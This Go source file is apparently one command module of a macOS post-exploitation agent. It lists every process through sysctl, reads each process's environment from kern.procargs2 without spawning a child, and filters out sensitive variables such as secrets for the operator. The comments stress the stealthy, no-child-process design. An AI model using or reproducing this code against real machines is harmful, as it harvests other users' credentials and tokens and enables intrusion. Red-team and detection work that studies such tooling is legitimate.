//go:build darwin
// +build darwin

package commands

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/unix"
)

// readProcessEnviron reads environment variables from a process on macOS
// using sysctl(KERN_PROCARGS2) — no child process spawned.
func readProcessEnviron(pid int) ([]string, string, error) {
	processName := fmt.Sprintf("pid-%d", pid)

	// Read process arguments + environment via kern.procargs2.
	// Layout: argc(int32) | exec_path\0 | args...\0 | \0-padding | env_vars\0
	buf, err := unix.SysctlRaw("kern.procargs2", pid)
	if err != nil {
		return nil, processName, fmt.Errorf("sysctl kern.procargs2: %v", err)
	}

	if len(buf) < 4 {
		return nil, processName, fmt.Errorf("buffer too small")
	}

	// Parse argc.
	argc := int(binary.LittleEndian.Uint32(buf[:4]))
	pos := 4

	// Extract exec path (process name).
	end := pos
	for end < len(buf) && buf[end] != 0 {
		end++
	}
	if end > pos {
		execPath := string(buf[pos:end])
		if idx := strings.LastIndex(execPath, "/"); idx >= 0 {
			processName = execPath[idx+1:]
		} else {
			processName = execPath
		}
	}
	pos = end

	// Skip null bytes after exec path.
	for pos < len(buf) && buf[pos] == 0 {
		pos++
	}

	// Skip argc command-line arguments.
	for i := 0; i < argc && pos < len(buf); i++ {
		for pos < len(buf) && buf[pos] != 0 {
			pos++
		}
		pos++ // skip the null terminator
	}

	// Everything remaining is null-terminated environment variables.
	var envVars []string
	for pos < len(buf) {
		// Find end of this string.
		end = pos
		for end < len(buf) && buf[end] != 0 {
			end++
		}
		if end == pos {
			break // empty string = end of env
		}
		s := string(buf[pos:end])
		if strings.Contains(s, "=") {
			envVars = append(envVars, s)
		}
		pos = end + 1
	}

	return envVars, processName, nil
}

// listAllPIDs enumerates all process IDs via sysctl(KERN_PROC_ALL)
// using golang.org/x/sys/unix — no child process spawned.
func listAllPIDs() ([]int, error) {
	procs, err := unix.SysctlKinfoProcSlice("kern.proc.all")
	if err != nil {
		return nil, fmt.Errorf("sysctl kern.proc.all: %v", err)
	}
	pids := make([]int, 0, len(procs))
	for _, p := range procs {
		pid := int(p.Proc.P_pid)
		if pid > 0 {
			pids = append(pids, pid)
		}
	}
	return pids, nil
}

// envScanAllProcesses scans all accessible processes for sensitive env vars.
func envScanAllProcesses(filter string) structs.CommandResult {
	pids, err := listAllPIDs()
	if err != nil {
		return errorf("Failed to list processes: %v", err)
	}

	var allResults []envScanResult
	totalProcesses := 0
	accessibleProcesses := 0
	myUID := os.Getuid()

	for _, pid := range pids {
		totalProcesses++

		// Skip kernel/launchd for non-root.
		if pid <= 1 && myUID != 0 {
			continue
		}

		envVars, processName, err := readProcessEnviron(pid)
		if err != nil {
			continue
		}
		accessibleProcesses++

		results := filterSensitiveVars(envVars, pid, processName)
		allResults = append(allResults, results...)
	}

	// Deduplicate
	allResults = deduplicateResults(allResults)

	if filter != "" {
		allResults = applyEnvFilter(allResults, filter)
	}

	output := formatEnvScanResults(allResults, totalProcesses, accessibleProcesses)
	return successResult(output)
}

func deduplicateResults(results []envScanResult) []envScanResult {
	type key struct {
		variable string
		value    string
	}
	seen := make(map[key]bool)
	var deduped []envScanResult

	for _, r := range results {
		k := key{r.Variable, r.Value}
		if !seen[k] {
			seen[k] = true
			deduped = append(deduped, r)
		}
	}
	return deduped
}
